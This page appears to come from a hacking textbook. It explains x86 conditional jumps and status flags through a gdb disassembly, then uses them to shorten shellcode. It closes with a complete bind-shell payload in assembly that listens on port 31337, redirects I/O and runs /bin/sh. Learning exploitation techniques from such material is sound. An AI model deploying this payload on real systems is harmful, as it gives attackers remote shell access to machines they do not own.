<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x542 Branching Control Structures</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part125.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part127.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark115">0x542 Branching Control Structures</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">The control structures of the C programming language, such as for loops and if-then-else blocks, are made up of conditional branches and loops in the machine language. With control structures, the repeated calls to <span class="s31">dup2 </span>could be shrunk down to a single call in a loop. The first C program written in previous chapters used a for loop to greet the world 10 times. Disassembling the main function will show us how the compiler implemented the for loop using assem- bly instructions. The loop instructions (shown below in bold) come after the function prologue instructions save stack memory for the local variable <span class="s31">i</span>. This variable is referenced in relation to the EBP register as <span class="s31">[ebp-4]</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_948.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc firstprog.c reader@hacking:~/booksrc $ gdb -q ./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) disass main</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Dump of assembler code for function main:</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048374</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+0&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">push</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048375</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+1&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp,esp</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048377</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+3&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">sub</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">esp,0x8</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x0804837a</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+6&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">and</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">esp,0xfffffff0</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x0804837d</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+9&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,0x0</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048382</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+14&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">sub</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp,eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048384</p></td><td style="width:51pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+16&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [ebp-4],0x0</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x0804838b</p></td><td style="width:51pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+23&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">cmp</p></td><td style="width:115pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [ebp-4],0x9</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x0804838f</p></td><td style="width:51pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+27&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">jle</p></td><td style="width:115pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048393 &lt;main+31&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048391</p></td><td style="width:51pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+29&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">jmp</p></td><td style="width:115pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x80483a6 &lt;main+50&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048393</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+31&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp],0x8048484</p></td></tr><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x0804839a</p></td><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+38&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">call</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x80482a0 &lt;printf@plt&gt;</p></td></tr></table><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:31pt"><td style="width:98pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x0804839f &lt;main+43&gt;:</p><p class="s45" style="text-indent: 0pt;text-align: left;">0x080483a2 &lt;main+46&gt;:</p><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0x080483a4 &lt;main+48&gt;:</p></td><td style="width:30pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">lea</p><p class="s45" style="padding-left: 4pt;text-indent: 0pt;text-align: left;">inc</p><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">jmp</p></td><td style="width:277pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,[ebp-4]</p><p class="s45" style="padding-left: 4pt;text-indent: 0pt;text-align: left;">DWORD PTR [eax]</p><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804838b &lt;main+23&gt;</p></td></tr><tr style="height:45pt"><td style="width:98pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 106%;text-align: left;">0x080483a6 &lt;main+50&gt;: 0x080483a7 &lt;main+51&gt;: End of assembler dump. (gdb)</p></td><td style="width:30pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 107%;text-align: left;">leave ret</p></td><td style="width:277pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-top: 4pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The loop contains two new instructions: <span class="s31">cmp </span>(compare) and <span class="s31">jle </span>(jump if less than or equal to), the latter belonging to the family of conditional jump instructions. The <span class="s31">cmp </span>instruction will compare its two operands, setting flags based on the result. Then, a conditional jump instruction will jump based on the flags. In the code above, if the value at <span class="s31">[ebp-4] </span>is less than or equal to 9, execution will jump to <span class="s31">0x8048393</span>, past the next <span class="s31">jmp </span>instruction. Otherwise, the next <span class="s31">jmp </span>instruction brings execution to the end of the function at <span class="s31">0x080483a6</span>, exiting the loop. The body of the loop makes the call to <span class="s31">printf()</span>, increments the counter variable at <span class="s31">[ebp-4]</span>, and finally jumps back to the compare instruc- tion to continue the loop. Using conditional jump instructions, complex</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">programming control structures such as loops can be created in assembly. More conditional jump instructions are shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="444" height="4" alt="image" src="Image_949.png"/></span></p><p class="s37" style="padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Instruction      Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="441" height="3" alt="image" src="Image_950.png"/></span></p><p class="s38" style="padding-left: 176pt;text-indent: -82pt;line-height: 109%;text-align: left;">cmp &lt;dest&gt;, &lt;source&gt; <span class="s48">Compare the destination operand with the source, setting flags for use with a conditional jump instruction.</span></p><p class="s38" style="padding-top: 3pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">je &lt;target&gt;     <span class="s48">Jump to target if the compared values are equal.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jne &lt;target&gt;    <span class="s48">Jump if not equal.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jl &lt;target&gt;     <span class="s48">Jump if less than.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jle &lt;target&gt;    <span class="s48">Jump if less than or equal to.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jnl &lt;target&gt;    <span class="s48">Jump if not less than.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jnle &lt;target&gt;    <span class="s48">Jump if not less than or equal to.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jg  jge     <span class="s48">Jump if greater than, or greater than or equal to.</span></p><p class="s38" style="padding-top: 4pt;padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jng  jnge     <span class="s48">Jump if not greater than, or not greater than or equal to.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="446" height="3" alt="image" src="Image_951.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">These instructions can be used to shrink the <span class="s31">dup2 </span>portion of the shellcode down to the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_952.png"/></span></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; dup2(connected socket, {all three standard I/O file descriptors}) mov ebx, eax   ; Move socket FD in ebx.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">xor eax, eax   ; Zero eax.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">xor ecx, ecx   ; ecx = 0 = standard input</p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">dup_loop:</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63 int 0x80    ; dup2(c, 0)</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">inc ecx</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">cmp BYTE cl, 2   ; Compare ecx with 2.</p><p class="s46" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">jle dup_loop   ; If ecx &lt;= 2, jump to dup_loop.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_953.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This loop iterates ECX from <span class="s31">0 </span>to <span class="s31">2</span>, making a call to <span class="s31">dup2 </span>each time. With a more complete understanding of the flags used by the <span class="s31">cmp </span>instruction, this loop can be shrunk even further. The status flags set by the <span class="s31">cmp </span>instruction are also set by most other instructions, describing the attributes of the instruction’s result. These flags are carry flag (CF), parity flag (PF), adjust flag (AF), over- flow flag (OF), zero flag (ZF), and sign flag (SF). The last two flags are the most useful and the easiest to understand. The zero flag is set to true if the result is zero, otherwise it is false. The sign flag is simply the most significant bit of the result, which is true if the result is negative and false otherwise.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">This means that, after any instruction with a negative result, the sign flag becomes true and the zero flag becomes false.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="442" height="4" alt="image" src="Image_954.png"/></span></p><p class="s37" style="padding-bottom: 3pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Abbreviation Name   Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="442" height="3" alt="image" src="Image_955.png"/></span></p><p class="s48" style="padding-left: 93pt;text-indent: 0pt;text-align: left;">ZF     zero flag True if the result is zero.</p><p class="s48" style="padding-top: 4pt;padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">SF     sign flag True if the result is negative (equal to the most significant bit of result).</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="442" height="3" alt="image" src="Image_956.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The <span class="s31">cmp </span>(compare) instruction is actually just a <span class="s31">sub </span>(subtract) instruction that throws away the results, only affecting the status flags. The <span class="s31">jle </span>(jump if less than or equal to) instruction is actually checking the zero and sign flags. If either of these flags is true, then the destination (first) operand is less than or equal to the source (second) operand. The other conditional jump instruc- tions work in a similar way, and there are still more conditional jump instructions that directly check individual status flags:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="245" height="4" alt="image" src="Image_957.png"/></span></p><p class="s37" style="padding-bottom: 3pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Instruction  Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="245" height="3" alt="image" src="Image_958.png"/></span></p><p class="s38" style="padding-left: 93pt;text-indent: 0pt;text-align: left;">jz &lt;target&gt;  <span class="s48">Jump to target if the zero flag is set.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jnz &lt;target&gt; <span class="s48">Jump if the zero flag is not set.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">js &lt;target&gt;  <span class="s48">Jump if the sign flag is set.</span></p><p class="s38" style="padding-top: 4pt;padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">jns &lt;target&gt; <span class="s48">Jump is the sign flag is not set.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="245" height="3" alt="image" src="Image_959.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">With this knowledge, the <span class="s31">cmp </span>(compare) instruction can be removed entirely if the loop’s order is reversed. Starting from <span class="s31">2 </span>and counting down, the sign flag can be checked to loop until <span class="s31">0</span>. The shortened loop is shown below, with the changes shown in bold.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_960.png"/></span></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; dup2(connected socket, {all three standard I/O file descriptors}) mov ebx, eax   ; Move socket FD in ebx.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">xor eax, eax   ; Zero eax.</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x2  ; ecx starts at 2. pop ecx</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">dup_loop:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63 int 0x80     ; dup2(c, 0)</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">dec ecx     ; Count down to 0.</p><p class="s46" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">jns dup_loop   ; If the sign flag is not set, ecx is not negative.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_961.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The first two instructions before the loop can be shortened with the <span class="s31">xchg </span>(exchange) instruction. This instruction swaps the values between the source and destination operands:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="351" height="4" alt="image" src="Image_962.png"/></span></p><p class="s37" style="padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Instruction       Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="349" height="3" alt="image" src="Image_963.png"/></span></p><p class="s38" style="padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">xchg &lt;dest&gt;, &lt;source&gt; <span class="s48">Exchange the values between the two operands.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="349" height="3" alt="image" src="Image_964.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 110%;text-align: justify;">This single instruction can replace both of the following instructions, which take up four bytes:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_965.png"/></span></p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">89 C3      mov ebx,eax</p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">31 C0       xor eax,eax</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_966.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The EAX register needs to be zeroed to clear only the upper three bytes of the register, and EBX already has these upper bytes cleared. So swapping the values between EAX and EBX will kill two birds with one stone, reduc- ing the size to the following single-byte instruction:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_967.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">93        xchg eax,ebx</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_968.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Since the <span class="s31">xchg </span>instruction is actually smaller than a <span class="s31">mov </span>instruction between two registers, it can be used to shrink shellcode in other places. Naturally, this only works in situations where the source operand’s register doesn’t matter. The following version of the bind port shellcode uses the exchange instruction to shave a few more bytes off its size.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">bind_shell.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_969.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; s = socket(2, 1, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x66  ; socketcall is syscall #102 (0x66). pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">cdq       ; Zero out edx for use as a null DWORD later. xor ebx, ebx   ; Ebx is the type of socketcall.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx      ; 1 = SYS_SOCKET = socket()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push edx      ; Build arg array: { protocol = 0, push BYTE 0x1   ;  (in reverse)   SOCK_STREAM = 1, push BYTE 0x2   ;           AF_INET = 2 }</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ecx, esp   ; ecx = ptr to argument array</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 212%;text-align: left;">int 0x80     ; After syscall, eax has socket file descriptor. xchg esi, eax   ; Save socket FD in esi for later.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; bind(s, [2, 31337, 0], 16)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push BYTE 0x66  ; socketcall (syscall #102) pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx      ; ebx = 2 = SYS_BIND = bind()</p><p class="s31" style="padding-top: 2pt;padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push edx     ; Build sockaddr struct: INADDR_ANY = 0 push WORD 0x697a ;  (in reverse order)  PORT = 31337 push WORD bx   ;            AF_INET = 2 mov ecx, esp   ; ecx = server struct pointer</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push BYTE 16   ; argv: { sizeof(server struct) = 16, push ecx     ;     server struct pointer, push esi     ;     socket file descriptor } mov ecx, esp   ; ecx = argument array</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; eax = 0 on success</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; listen(s, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE al, 0x66 ; socketcall (syscall #102) inc ebx</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">inc ebx      ; ebx = 4 = SYS_LISTEN = listen()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push ebx     ; argv: { backlog = 4,</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push esi      ;     socket fd } mov ecx, esp    ; ecx = argument array int 0x80</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; c = accept(s, 0, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov BYTE al, 0x66 ; socketcall (syscall #102)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx     ; ebx = 5 = SYS_ACCEPT = accept()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push edx     ; argv: { socklen = 0,</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push edx     ;     sockaddr ptr = NULL,</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push esi      ;     socket fd } mov ecx, esp    ; ecx = argument array</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; eax = connected socket FD</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 106%;text-align: left;">; dup2(connected socket, {all three standard I/O file descriptors}) xchg eax, ebx   ; Put socket FD in ebx and 0x00000005 in eax. push BYTE 0x2   ; ecx starts at 2.</p><p class="s31" style="padding-left: 91pt;text-indent: 8pt;line-height: 107%;text-align: left;">pop ecx dup_loop:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63 int 0x80     ; dup2(c, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">dec ecx     ; count down to 0</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">jns dup_loop   ; If the sign flag is not set, ecx is not negative.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[]) mov BYTE al, 11  ; execve syscall #11</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push edx     ; push some nulls for string termination. push 0x68732f2f  ; push &quot;//sh&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push 0x6e69622f  ; push &quot;/bin&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov ebx, esp   ; Put the address of &quot;/bin//sh&quot; into ebx via esp. push edx     ; push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ebx      ; push string addr to stack above null terminator. mov ecx, esp    ; This is the argv array with string ptr</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80    ; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_970.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 110%;text-align: left;">This assembles to the same 92-byte bind_shell shellcode used in the previous chapter.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_971.png"/></span></p><p class="s31" style="padding-left: 